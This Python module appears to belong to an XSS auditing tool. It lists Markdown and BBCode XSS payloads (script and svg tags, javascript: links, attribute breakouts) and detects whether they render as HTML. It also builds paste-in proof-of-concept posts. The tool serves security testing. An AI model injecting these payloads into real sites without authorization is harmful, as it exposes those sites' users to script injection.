"""Markdown / BBCode rendered XSS detection.

Many sites accept user-supplied Markdown or BBCode (comments, forum
posts, wiki pages, README renders) and render it to HTML on the
server or in the browser.  Vulnerable renderership is a common XSS
vector because:

  * **Inline HTML is allowed by default in CommonMark.**  Raw
    ``<script>`` / ``<svg>`` / ``<iframe>`` blocks survive parsing
    unless the renderer explicitly disables them (``html: false``).
  * **Autolink / link hrefs are not URL-scheme-validated.**
    ``[click](javascript:alert(1))`` runs JavaScript when the
    renderer fails to whitelist ``http`` / ``https`` / ``mailto``.
  * **Image src / onerror attribute injection.**  Some renderers
    accept quoted attribute values inside ``![alt](src)``, allowing
    ``![x](x" onerror=alert(1))`` to break out of the ``src``
    attribute.
  * **Reference-style links** defer the URL to a separate
    ``[ref]: url`` definition.  Naive sanitizers that only check
    inline link URLs miss the reference form.
  * **Code-block / inline-code breakouts.**  Some renderers (and
    some downstream highlighters) mis-parse escaped sequences inside
    ````` ``` ````` blocks, allowing the closing fence to be smuggled
    and HTML to leak out.
  * **BBCode tag attribute injection.**  ``[url=javascript:alert(1)]``
    and ``[img]x" onerror=alert(1)[/img]`` exploit BBCode parsers
    that fail to validate the URL scheme or quote-escape attribute
    values.

A typical vulnerable snippet (Python ``markdown`` with default
settings)::

    import markdown
    html = markdown.markdown(user_input)
    # -> renders inline <script> verbatim!

User posts ``<svg onload=alert(1)>`` and the page executes the handler
on render.

This module:

  1. Lists canonical Markdown and BBCode XSS payloads.
  2. Detects whether a marker survived rendering into the response.
  3. Distinguishes "raw echo" (payload still in Markdown source form)
     from "rendered HTML" (payload produced HTML tags in the
     response), which is the dangerous case.
  4. Classifies the surrounding context.
  5. Builds standalone Markdown and BBCode PoC documents that an
     auditor can paste into a target input.
"""
from __future__ import annotations
import re


# Markdown XSS payloads.  Each contains the literal token ``xssentinel``
# so reflection can be detected by string search even when the
# surrounding tag is mangled by an HTML-encoding filter or by partial
# Markdown rendering.
#
# Categories covered:
#   * Inline HTML -- CommonMark allows raw HTML blocks / spans by
#     default.
#   * Inline links with javascript: / data: URLs.
#   * Reference-style links (URL is defined separately).
#   * Reference-style images.
#   * Image src attribute breakout via unescaped quote.
#   * Autolink ``<javascript:...>`` (URL autolink).
#   * Inline-link with malformed protocol-relative URL.
#   * Code-block fence breakout (rendered HTML leaks after the fence).
#   * HTML comment conditional-comment-style breakout for IE / legacy.
#   * Mixed-case / entity-encoded ``<script>`` to defeat naive filters.
MARKDOWN_PAYLOADS: list[str] = [
    # Plain marker -- test whether ANY of the source lands raw.
    "xssentinel",
    # Inline HTML (CommonMark allows raw HTML by default)
    "<script>alert(1)</script>",
    "<svg onload=alert(1)>",
    "<img src=x onerror=alert(1)>",
    "<body onload=alert(1)>",
    "<iframe src=javascript:alert(1)>",
    "<details open ontoggle=alert(1)>",
    "<marquee onstart=alert(1)>",
    # Inline links with javascript: / data: URLs
    "[click](javascript:alert(1))",
    "[click](javascript:alert`1`)",
    "[click](javascript:/* */alert(1))",
    "[click](data:text/html,<script>alert(1)</script>)",
    "[click](vbscript:alert(1))",
    # Image src + onerror breakout
    "![x](x\" onerror=alert(1))",
    "![x](x onerror=alert(1))",
    "![x](javascript:alert(1))",
    # Reference-style links (URL defined separately)
    "[click][1]\n\n[1]: javascript:alert(1)",
    "[click][ref]\n\n[ref]: data:text/html,<script>alert(1)</script>",
    # Reference-style images
    "![x][1]\n\n[1]: x\" onerror=alert(1)",
    # Autolink URL form
    "<javascript:alert(1)>",
    "<data:text/html,<script>alert(1)</script>>",
    # Mixed-case / entity-encoded script for naive filters
    "<ScRiPt>alert(1)</ScRiPt>",
    "<svg/ONLOAD=alert(1)>",
    "&#60;script&#62;alert(1)&#60;/script&#62;",
    # Code-block fence breakout (closing fence smuggled, HTML leaks)
    "```\nx\n```\n<svg onload=alert(1)>",
    "~~~\nxssentinel\n~~~\n<script>alert(1)</script>",
    # HTML comment-style breakout
    "<!-- --><script>alert(1)</script><!-- -->",
    # Mixed HTML + Markdown to defeat sanitizer that strips only
    # well-formed tags
    "<svg/onload=alert(1)>",
    "<a href=javascript:alert(1)>x</a>",
    # Title-attribute breakout on inline link
    '[x](http://x " title onmouseover=alert(1) x=")',
]


# BBCode XSS payloads.  BBCode syntax varies between forum engines
# (phpBB, vBulletin, XenForo, Discuz!), so we cover the common
# ``[url]``, ``[img]``, ``[color]``, ``[size]``, ``[email]`` and
# ``[quote]`` tags.  Each payload embeds ``xssentinel`` for reflection
# detection.
BBCODE_PAYLOADS: list[str] = [
    # Plain marker
    "xssentinel",
    # [url=...] with javascript: scheme
    "[url=javascript:alert(1)]click[/url]",
    "[url=javascript:alert`1`]click[/url]",
    "[url=javascript:alert(1)]xssentinel[/url]",
    # [url]http://...[/url] with attribute breakout
    "[url]http://x\" onmouseover=alert(1) x=\"[/url]",
    # [img]src[/img] with onerror breakout
    "[img]x\" onerror=alert(1)[/img]",
    "[img]javascript:alert(1)[/img]",
    "[img]x onerror=alert(1)[/img]",
    # [email] with attribute breakout
    "[email]x\" onfocus=alert(1) autofocus=[/email]",
    # [color] / [size] / [font] attribute breakout
    "[color=\" onmouseover=alert(1) x=\"]red[/color]",
    "[size=\" onmouseover=alert(1) x=\"]12[/size]",
    "[font=\" onmouseover=alert(1) x=\"]Arial[/font]",
    # [quote] with embedded HTML
    "[quote]<script>alert(1)</script>[/quote]",
    "[quote]<svg onload=alert(1)>[/quote]",
    # Inline HTML in BBCode (engines that pass HTML through)
    "<script>alert(1)</script>",
    "<svg onload=alert(1)>",
    "<img src=x onerror=alert(1)>",
    # Mixed-case / entity-encoded
    "<ScRiPt>alert(1)</ScRiPt>",
    "<SVG/ONLOAD=alert(1)>",
    "&#60;script&#62;alert(1)&#60;/script&#62;",
    # [url] with javascript scheme and inner tag
    "[url=javascript:alert(1)]<svg onload=alert(1)>[/url]",
    # Some engines render [img]src onerror=...[/img] as a raw
    # attribute sequence when the URL is malformed
    "[img]x\"onerror=alert(1)[/img]",
    # [code] / [php] / [html] block breakouts
    "[code]<script>alert(1)</script>[/code]",
    "[html]<svg onload=alert(1)>[/html]",
]


# Regex for detecting that a Markdown payload was rendered to HTML
# (i.e. the response contains HTML tags rather than the raw Markdown
# source).  We look for any HTML tag in the response that is NOT part
# of the original Markdown source.
_HTML_TAG_RE = re.compile(r"<[a-zA-Z][^>]*>", re.DOTALL)

# Detect dangerous HTML tags specifically -- these are the tags that
# actually execute JavaScript.
_DANGEROUS_TAG_RE = re.compile(
    r"<(?:script|svg|img|body|iframe|details|marquee|object|embed|a)\b[^>]*>",
    re.IGNORECASE | re.DOTALL,
)

# Detect dangerous URL schemes inside attribute values
_DANGEROUS_SCHEME_RE = re.compile(
    r"\b(?:javascript|vbscript|data)\s*:", re.IGNORECASE,
)

# Detect dangerous event-handler attributes
_EVENT_HANDLER_RE = re.compile(
    r"\bon\w+\s*=", re.IGNORECASE,
)


# Context-classifier regexes for the rendered output.  The first
# matching context wins.
_CONTEXT_HTML_TAG_RE = re.compile(
    r"<\w+[^>]*\b\w+\s*=\s*[^>]*xssentinel", re.IGNORECASE,
)
_CONTEXT_ATTR_VALUE_RE = re.compile(
    r"\b\w+\s*=\s*['\"][^'\"]*xssentinel", re.IGNORECASE,
)
_CONTEXT_SCRIPT_BLOCK_RE = re.compile(
    r"<script[^>]*>[^<]*xssentinel", re.IGNORECASE | re.DOTALL,
)
_CONTEXT_JS_STRING_RE = re.compile(
    r"['\"`][^'\"`]{0,200}xssentinel[^'\"`]{0,200}['\"`]", re.DOTALL,
)
_CONTEXT_HTML_COMMENT_RE = re.compile(
    r"<!--[^>]*xssentinel", re.DOTALL,
)
_CONTEXT_TEXT_RE = re.compile(r"xssentinel")


# Marker used by detect_reflection / analyze_response.  Callers SHOULD
# embed this token in their payload so the reflection check is
# reliable across filter transformations.
DEFAULT_MARKER = "xssentinel"


def payloads() -> list[str]:
    """Return Markdown + BBCode payloads combined.

    Order: Markdown payloads first, then BBCode.  These are static
    attack shapes -- reflection detection is marker-based and happens
    in ``detect_reflection`` / ``analyze_response`` (the marker is
    supplied by the caller, not embedded in these payloads).
    """
    # Preserve order, drop duplicates while keeping Markdown first.
    seen: set[str] = set()
    out: list[str] = []
    for p in MARKDOWN_PAYLOADS + BBCODE_PAYLOADS:
        if p not in seen:
            seen.add(p)
            out.append(p)
    return out


def detect_reflection(response_text: str | None, marker: str) -> bool:
    """Return True if ``marker`` appears verbatim in ``response_text``.

    Treats ``None`` / empty inputs as no reflection.  The check is a
    plain substring search (case-sensitive) so callers can use a
    distinctive marker such as ``xssentinel1234``.
    """
    if not response_text or not marker:
        return False
    return marker in response_text


def _classify_context(response_text: str, marker: str) -> str:
    """Classify the reflection context of ``marker`` in ``response_text``.

    Returns one of: ``html_tag``, ``attribute``, ``script``,
    ``js_string``, ``comment``, ``text``, or ``none``.
    """
    if marker not in response_text:
        return "none"
    # Phase 76: most-specific context wins.  The original order let the
    # broad html_tag regex swallow attribute reflections, and let the
    # attribute regex (\w+ = '...xssentinel') swallow JS assignments
    # inside <script> blocks.  Order now: block contexts first, then
    # attribute values, then bare tag positions, then JS strings.
    if _CONTEXT_SCRIPT_BLOCK_RE.search(response_text):
        return "script"
    if _CONTEXT_HTML_COMMENT_RE.search(response_text):
        return "comment"
    if _CONTEXT_ATTR_VALUE_RE.search(response_text):
        return "attribute"
    if _CONTEXT_HTML_TAG_RE.search(response_text):
        return "html_tag"
    if _CONTEXT_JS_STRING_RE.search(response_text):
        return "js_string"
    if _CONTEXT_TEXT_RE.search(response_text):
        return "text"
    return "text"


def _is_rendered_html(response_text: str, marker: str) -> bool:
    """Return True if the response contains HTML tags from the payload.

    This is the dangerous case: the renderer converted the Markdown /
    BBCode source into HTML.  We consider the payload "rendered to
    HTML" if any of the following hold:

      * A dangerous HTML tag (``<script>``, ``<svg>``, ``<img>``,
        ``<iframe>``, etc.) appears in the response.
      * A dangerous URL scheme (``javascript:``, ``vbscript:``,
        ``data:``) appears in an attribute value.
      * An ``on...=`` event-handler attribute appears.
    """
    if not response_text:
        return False
    if _DANGEROUS_TAG_RE.search(response_text):
        return True
    if _DANGEROUS_SCHEME_RE.search(response_text):
        return True
    if _EVENT_HANDLER_RE.search(response_text):
        return True
    # Fallback: any HTML tag is present AND the marker is reflected.
    # This catches cases where the payload used a benign tag like
    # ``<a>`` to test rendering, and the marker survived inside an
    # attribute.
    if marker and marker in response_text and _HTML_TAG_RE.search(response_text):
        return True
    return False


def analyze_response(response_text: str | None, marker: str) -> dict:
    """Classify the reflection / rendering of ``marker`` in the response.

    Returns::

        {
            "reflected":     bool,   # marker present at all
            "rendered_html": bool,   # response contains HTML tags /
                                     # attributes / schemes produced by
                                     # rendering the payload (the
                                     # dangerous case)
            "context":       str,    # one of:
                                     #   "html_tag"   -- inside a tag
                                     #   "attribute"  -- inside an attr value
                                     #   "script"     -- inside <script>
                                     #   "js_string"  -- inside a JS string
                                     #   "comment"    -- inside an HTML comment
                                     #   "text"       -- raw HTML text
                                     #   "none"       -- not reflected
            "marker":        str,    # echo of the marker arg
        }
    """
    if not response_text or not marker:
        return {
            "reflected": False,
            "rendered_html": False,
            "context": "none",
            "marker": marker or "",
        }
    reflected = marker in response_text
    ctx = _classify_context(response_text, marker) if reflected else "none"
    rendered = _is_rendered_html(response_text, marker)
    return {
        "reflected": reflected,
        "rendered_html": rendered,
        "context": ctx,
        "marker": marker,
    }


def build_poc_markdown(payload: str) -> str:
    """Build a standalone Markdown document embedding ``payload``.

    The document is intended to be pasted into a Markdown-rendering
    input (comment box, README editor, wiki page).  It includes a
    header that explains the test and the payload placed in a few
    different syntactic contexts (block, paragraph, list item) so
    the auditor can see how the renderer handles each.
    """
    if not payload:
        return ""
    # Escape any ````` fence collision by replacing three-or-more
    # backticks in the payload with a marker that we will not use as
    # a fence.  The payload is presented verbatim inside a fenced
    # code block AND in raw form so the auditor can see both the
    # source and the rendered output.
    safe_payload = payload.replace("```", "`` ")
    return (
        "# XSSentinel -- Markdown XSS PoC\n"
        "\n"
        "> Render this document in the target Markdown renderer.  If\n"
        "> any of the payloads below execute JavaScript, the renderer\n"
        "> is vulnerable.\n"
        "\n"
        "## Payload (raw source)\n"
        "\n"
        "```\n"
        f"{safe_payload}\n"
        "```\n"
        "\n"
        "## Payload (rendered inline)\n"
        "\n"
        f"{payload}\n"
        "\n"
        "## Payload inside a list item\n"
        "\n"
        f"- {payload}\n"
        "\n"
        "## Payload inside a blockquote\n"
        "\n"
        f"> {payload}\n"
    )


def build_poc_bbcode(payload: str) -> str:
    """Build a standalone BBCode document embedding ``payload``.

    The document is intended to be pasted into a BBCode-rendering
    input (forum post, comment box).  It wraps the payload in a
    ``[quote]`` block (so it is visually demarcated) and presents
    it inline so the renderer's tag / attribute handling is visible.
    """
    if not payload:
        return ""
    return (
        "[b]XSSentinel -- BBCode XSS PoC[/b]\n"
        "\n"
        "[quote]Render this post in the target BBCode renderer. "
        "If any of the payloads below execute JavaScript, the renderer "
        "is vulnerable.[/quote]\n"
        "\n"
        "[b]Payload (raw source):[/b]\n"
        f"[code]{payload}[/code]\n"
        "\n"
        "[b]Payload (rendered inline):[/b]\n"
        f"{payload}\n"
        "\n"
        "[b]Payload inside a quote:[/b]\n"
        f"[quote]{payload}[/quote]\n"
        "\n"
        "[b]Payload inside a list item:[/b]\n"
        f"[list][*]{payload}[/list]\n"
    )
